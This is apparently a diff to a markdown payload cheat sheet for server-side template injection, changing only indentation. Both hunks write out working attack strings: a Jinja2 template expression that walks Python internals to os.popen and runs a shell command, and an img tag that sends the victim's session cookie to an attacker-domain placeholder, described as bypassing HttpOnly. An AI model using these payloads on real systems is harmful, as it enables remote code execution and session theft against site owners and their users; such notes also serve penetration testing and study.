@@ -9,15 +9,15 @@
 ### Arbitrary commands can be executed remotely.
 
 - RCE
-  ```python
-  {{ self._TemplateReference__context.config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
-  ```
+    ```python
+    {{ self._TemplateReference__context.config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
+    ```
 
 ## Client-Side Protection Bypass
 
 ### Client-side protections can be bypassed.
 
 - Bypassing HttpOnly and Exfiltrating Session Cookie Value
-  ```javascript
-  <img src=https://[ATTACKER-DOMAIN]/?cookie={{request.cookies.session}}>
-  ```
+    ```javascript
+    <img src=https://[ATTACKER-DOMAIN]/?cookie={{request.cookies.session}}>
+    ```
